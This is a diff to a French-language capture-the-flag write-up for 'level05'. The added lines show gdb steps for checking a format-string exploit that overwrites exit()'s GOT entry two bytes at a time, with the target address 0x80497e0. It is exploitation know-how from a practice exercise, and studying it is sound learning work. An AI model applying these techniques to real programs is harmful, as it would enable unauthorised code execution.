@@ -50,6 +50,14 @@ En testant des valeurs arbitraires (comme des 'AAAABBBBCCCC') on se rend compte 
 
 	print pad(exploit)
 
+Pour verifier a quoi ressembler l'adresse que nous reecrivons entre chaque modification :
+
+	$ python /tmp/exp.py > /tmp/pay
+	$ gdb level05
+	$ b*main+207
+	$ r < /tmp/pay
+	$ 0x80497e0
+
 Nous arrivons donc a reecrire (2 bytes par 2 bytes) l'adresse de exit() sur la GOT. Le tour est joue.
 
 	python /tmp/exp.py > /tmp/pay
